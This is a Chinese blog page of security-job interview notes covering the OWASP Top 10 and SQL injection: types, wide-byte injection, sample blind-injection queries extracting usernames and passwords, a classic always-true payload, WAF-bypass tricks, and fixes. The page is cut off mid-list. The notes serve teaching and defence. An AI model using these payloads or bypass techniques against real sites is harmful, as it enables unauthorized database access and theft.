<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="彪的HW面经（第二版）, DU-玉 渗透测试 CTF PWN 护网行动 公安联考 考研 ">
    <meta name="description" content="中国人民警察大学 | 电子取证 | 护网 | 二进制 ">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg" />
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>彪的HW面经（第二版） | DU-玉</title>

    <link rel="icon" type="image/jpeg" href="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/hsy-head.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;900&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?aaa6c944b0ed07922901d7fc571a171d";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="DU-玉" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/hsy-head.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">DU-玉</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/archives">
          
          <i class="fas fa-paper-plane" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>时轴</span>
        </a>
      </li>
      
      <li>
        <a href="/categories">
          
          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>分类</span>
        </a>
      </li>
      
      <li>
        <a href="/tags">
          
          <i class="fas fa-tag" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>标签</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
      
      <span>清单</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/List/music">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>音乐</span>
        </a>
      </li>
      
      <li>
        <a href="/List/galleries">
          
          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>相册</span>
        </a>
      </li>
      
      <li>
        <a href="/List/movies">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>视频</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-envelope" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tools" class="waves-effect waves-light">
      
      <i class="fas fa-suitcase" style="zoom: 0.6;"></i>
      
      <span>百宝箱</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/Windows" class="waves-effect waves-light">
      
      <i class="fas fa-desktop" style="zoom: 0.6;"></i>
      
      <span>DU-玉分站</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-link" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/hsy-head.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">DU-玉</div>
        <div class="logo-desc">
            
            中国人民警察大学 | 电子取证 | 护网 | 二进制 
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-archive"></i>
			
			归档
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/archives " style="margin-left:75px">
				  
				   <i class="fa fas fa-paper-plane" style="position: absolute;left:50px" ></i>
			      
		          <span>时轴</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories " style="margin-left:75px">
				  
				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
			      
		          <span>分类</span>
                  </a>
                </li>
              
                <li>

                  <a href="/tags " style="margin-left:75px">
				  
				   <i class="fa fas fa-tag" style="position: absolute;left:50px" ></i>
			      
		          <span>标签</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-heartbeat"></i>
			
			清单
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/List/music " style="margin-left:75px">
				  
				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
			      
		          <span>音乐</span>
                  </a>
                </li>
              
                <li>

                  <a href="/List/galleries " style="margin-left:75px">
				  
				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
			      
		          <span>相册</span>
                  </a>
                </li>
              
                <li>

                  <a href="/List/movies " style="margin-left:75px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
			      
		          <span>视频</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-envelope"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tools" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-suitcase"></i>
			
			百宝箱
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/Windows" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-desktop"></i>
			
			DU-玉分站
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-link"></i>
			
			友链
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
				<i class="fas fa-fw fa-link"></i>
			
			关于
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://poison-biao.github.io/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>github
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://poison-biao.github.io/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="github" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('你干嘛，DU-玉基本不可能会给外人密码的，偷看隐私可不好哦 ~')).toString(CryptoJS.enc.Hex)) {
                alert('猜密码是猜不到的哟，找DU-玉要正确的密码吧 ~');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731020619406.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">彪的HW面经（第二版）</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        background-color: white;
        width: 345px;
        padding-left: 20px;
        border-radius: 10px;
        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }
    
    #toc-content {
        height: calc(100vh - 300px);
        overflow: scroll;

    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
        bottom: 120px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/HW%E9%9D%A2%E7%BB%8F/">
                                <span class="chip bg-color">HW面经</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/HW/" class="post-category">
                                HW
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-07-26
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-08-03
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    24.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    89 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="一、TOP10"><a href="#一、TOP10" class="headerlink" title="一、TOP10"></a>一、TOP10</h2><pre class="line-numbers language-none"><code class="language-none">1.SQL注入
2.失效的身份认证和会话管理
3.跨站脚本攻击XSS
4.直接引用不安全的对象
5.安全配置错误
6.敏感信息泄露
7.缺少功能级的访问控制
8.跨站请求伪造CSRF
9.实验含有已知漏洞的组件
10.未验证的重定向和转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="一、sql注入"><a href="#一、sql注入" class="headerlink" title="一、sql注入"></a>一、sql注入</h2><p>sql注入的<strong>原理</strong>：<strong>利用应用程序没有正确过滤或转义用户输入的数据</strong>，<strong>导致恶意用户可以在 应用的查询语句中插入自己的SQL代码并传递</strong></p>
<p><strong>给后台SQL服务器时加以解析并执行</strong>。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p>
<pre class="line-numbers language-none"><code class="language-none">把用户输入的数据当作代码执行。 

包含两个关键条件： 一：用户能够控制输入；二：原本程序要执行的代码，拼接了用户输入的数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。</p>
<p>因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。</p>
<p><strong>sql的类型有什么</strong>：</p>
<p>常见（联合查询，布尔，延时，报错），其他（宽字节，堆叠，等等）</p>
<pre class="line-numbers language-none"><code class="language-none">数字型、字符型、GRT 注入、POST 注入、cookie 注入、布尔盲注、时间盲注、延时注入、编码注入、联合查询注入、堆查询注入等

- 根据数据的传输方式
  - GET 类型
  - POST 类型
  - COOKIE 类型
- 根据数据的类型
  - 数字型
  - 字符型
- 根据注入的模式
  - 基于联合查询的注入模式
  - 基于报错的注入模式
  - 基于布尔的盲注
  - 基于时间的盲注
  - 基于查询的注入模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>sql注入宽字节的原理：</strong></p>
<p>目标站点对于特殊字符的转义（单双引号）前面会添加斜杠/，斜杠/ url 编码是 %5c，如果目标站点使用的是 gbk 编码，则可以构造 payload %df 加 单引号，%df 与%5c 进行结合成为一个汉字，而单引号则逃逸了出去。</p>
<p><strong>sql注入经常出现的地方</strong></p>
<ul>
<li><p>内部实现 / 流程的角度</p>
<p>url 传参、表单 post、Cookie、User-Agent、X-Forwarded-For…</p>
</li>
<li><p>业务点</p>
<p>新闻 / 商品等查询处、用户注册 / 登陆处、修改用户资料时、找回密码处、搜索框…</p>
</li>
</ul>
<p>简言之：一切可以与数据库进行交互的地方。</p>
<p><strong>SQL 注入的一般步骤</strong></p>
<ul>
<li>求闭合字符</li>
<li>选择注入模式</li>
<li>爆数据库</li>
<li>爆表名</li>
<li>爆列名</li>
<li>爆字段</li>
</ul>
<p><strong>sql类型介绍</strong>：</p>
<ol>
<li>基于错误的注入（Error-Based Injection）：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。</li>
<li>盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以<strong>利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</strong></li>
<li>基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向<strong>查询结果集中添加用户列表或密码信息。</strong></li>
<li>基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，<strong>该查询会返回一个布尔值</strong>，例如真或假。攻击者可以<strong>利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</strong></li>
<li>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过<strong>向查询中添加时间延迟语句来判断查询是否成功执行</strong>。例如，攻击者可以使用 <strong>SLEEP()</strong> 函数来强制查询等待一段时间，在等待期间<strong>观察程序的响应时间来确定注入点是否存在</strong>。</li>
</ol>
<p>总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 注入漏洞的出现。</p>
<p><strong>1、sql注入延时函数sleep禁用怎么办：</strong></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175502879.png" alt="image-20230731175502879"></p>
<p><strong>2、sql报错注入的函数有哪些：</strong></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170738154.png" alt="image-20230731170738154"></p>
<p><strong>报错注入函数</strong></p>
<p>报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。</p>
<p>您提到的“报错注入函数”，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p>
<ol>
<li>substring() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>length() 函数：该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SELECT LENGTH((SELECT username from users WHERE id=1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>ASCII() 函数：该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>总之，报错注入是一种危险的攻击方式，可以导致泄漏敏感信息、执行未经授权的操作等安全问题。因此，开发人员必须采取适当的安全措施，例如对所有输入数据进行验证和过滤，不要直接拼接 SQL 语句，使用参数化查询等。同时，也应该定期测试应用程序以检测是否存在 SQL 注入漏洞。</p>
<p><strong>支持报错注入的数据库都有哪些</strong></p>
<p>报错注入是一种比较常见的 SQL 注入技术，不同的数据库在报错注入方面的支持程度不同。以下是一些主要的数据库和它们在报错注入方面的支持情况：</p>
<ol>
<li>MySQL：MySQL 是一个流行的开源关系型数据库管理系统，它对报错注入提供了很好的支持。</li>
<li>Microsoft SQL Server：Microsoft SQL Server 是微软开发的关系型数据库管理系统，它对报错注入也提供了很好的支持。</li>
<li>Oracle：Oracle 是一个功能强大的商业级数据库管理系统，它对报错注入的支持相对较差。</li>
<li>PostgreSQL：PostgreSQL 是一个开源的对象关系型数据库管理系统，它对报错注入的支持相对较好。</li>
<li>SQLite：SQLite 是一个嵌入式关系型数据库管理系统，它对报错注入的支持较弱。</li>
</ol>
<p>总之，在进行 SQL 注入测试时，我们需要针对目标数据库的特定版本和配置进行适当的测试，并注意不同数据库之间在报错注入方面的区别。同时，开发人员在编写应用程序时，应该采取适当的安全措施来防止 SQL 注入攻击。</p>
<p><strong>3、SQL 注入如何进行检测</strong></p>
<ol>
<li>数据库异常日志：在数据库服务器上查看异常日志或错误日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。</li>
<li>应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。</li>
<li>漏洞扫描工具：使用专业的漏洞扫描工具，可以自动化地检测应用程序中可能存在的 SQL 注入漏洞，并提供修补建议。</li>
<li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li>
<li>手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。</li>
</ol>
<p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的 SQL 注入检测方法。在进行 SQL 注入检测时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。同时，如果确实发现了 SQL 注入攻击，应及时采取措施来修复漏洞并保护数据库中的数据。</p>
<p><strong>SQL注入常见的关键字：</strong></p>
<ol>
<li><code>UNION</code>：<code>UNION</code>操作符用于结合两个或更多的<code>SELECT</code>语句的结果集，并移除重复的数据。</li>
<li><code>OR</code> / <code>AND</code>：这些逻辑操作符可以用于创建更复杂的查询条件。</li>
<li><code>--</code>、<code>#</code>、<code>/*</code>：这些都是SQL注释符，可以用来结束原始SQL语句，从而使注入的SQL代码生效。</li>
<li><code>';</code>：这是SQL语句的结束符，也可以用来结束原始SQL语句，从而使注入的SQL代码生效。</li>
<li><code>'='</code>、<code>'LIKE'</code>：这些操作符可以用于创建查询条件。</li>
<li><code>' ' or 'x'='x'</code>：这是一个经典的SQL注入例子，如果应用程序没有对用户输入进行适当的处理，那么这个查询条件就会永远为真。</li>
</ol>
<p><strong>4、Sql 注入加固措施？</strong></p>
<p>为了防止 SQL 注入攻击，可以采取以下一些常见的加固措施：</p>
<ol>
<li>输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。</li>
<li>参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。</li>
<li>最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。</li>
<li>安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式，而是采用参数化查询等安全方式来操作数据库。</li>
<li>异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。</li>
<li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li>
</ol>
<p>需要注意的是，以上只是其中一部分常见的 SQL 注入加固措施，针对不同的应用和场景，可能需要采用不同的加固措施。在进行 SQL 注入防御时，需要综合考虑多种因素，并不断更新和完善自身的防御措施，以提高安全水平并减少被攻击的风险。</p>
<p><strong>sql注入怎么修复</strong></p>
<p>修复SQL注入漏洞的主要方法之一是使用<strong>参数化查询</strong>。这种技术可以将用户输入作为参数传递给数据库查询，而不是将其拼接到查询字符串中。通过这种方式，应用程序可以避免恶意用户在输入中注入任何SQL代码。</p>
<p>另一个修复SQL注入漏洞的方法是<strong>对输入数据进行严格的验证和过滤</strong>。这需要开发人员仔细检查所有用户输入数据，并确保它们只包含有效的字符和格式。例如，如果一个输入字段只接受数字，则必须验证输入是否仅包含数字，并拒绝包含其他字符的输入。</p>
<p>最后，还可以使用安全的编程实践来保护应用程序免受SQL注入攻击。这包括限制应用程序的权限以及使用加密和身份验证等安全措施来保护数据库服务器和应用程序。</p>
<p>总之，修复SQL注入漏洞的关键是开发人员需要了解并理解如何处理用户输入，并采取必要的措施来确保输入数据的完整性和安全性。</p>
<p><strong>sql注入遇到waf，怎么绕过</strong></p>
<p>以下是几种常见的方法：</p>
<ol>
<li>使用编码：攻击者可以对注入负载进行编码，例如使用十六进制或Unicode编码等方式，以绕过<strong>WAF对字符集的检查</strong>。攻击者还可以使用<strong>字符串分割、大小写转换等技术手段，以使WAF无法识别恶意代码。</strong></li>
<li><strong>使用注入器：SQL注入攻击工具如Sqlmap、Havij、SQLi-hunter等，可以</strong>自动检测和利用各种SQL注入漏洞，并通过绕过WAF来获取敏感数据。</li>
<li>盲注：在盲注攻击中，攻击者不直接获取查询结果，而是根据应用程序的响应来判断是否存在漏洞。攻击者可以<strong>使用时间延迟或错误信息来判断是否存在漏洞，并以此来推断数据库中的数据。</strong></li>
<li>变形注入：变形注入攻击是一种多次执行的注入攻击，使用变体的注入负载，使注入负载不同于以前的攻击负载，从而逃避WAF的检测。</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">1，关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct
2，通杀的，内联注释，如 /*!select*/
3，编码，可两次编码
4，multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了
绝大多数 WAF
5，参数绕过，复制参数，id=1&amp;id=1
6，组合法 如 and 可以用&amp;&amp;再 URL 编码
7、替换法，如 and 改成&amp;&amp;;=可以用 like 或 in 等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>SQL 注入读写文件的根本条件</p>
<p>数据库允许导入导出（secure_file_priv）</p>
<p>当前用户用户文件操作权限（File_priv）</p>
<table>
<thead>
<tr>
<th>secure_file_prive  参数的设置</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>secure_file_prive=null</td>
<td>限制 mysqld 不允许导入导出</td>
</tr>
<tr>
<td>secure_file_priv=/tmp/</td>
<td>限制 mysqld 的导入导出只能发 生在 /tmp/ 目录下</td>
</tr>
<tr>
<td>secure_file_priv=’ ‘</td>
<td>不对 mysqld 的导入导出做限制</td>
</tr>
</tbody></table>
<p>secure_file_prive 直接在 my.ini 文件里设置即可</p>
<ul>
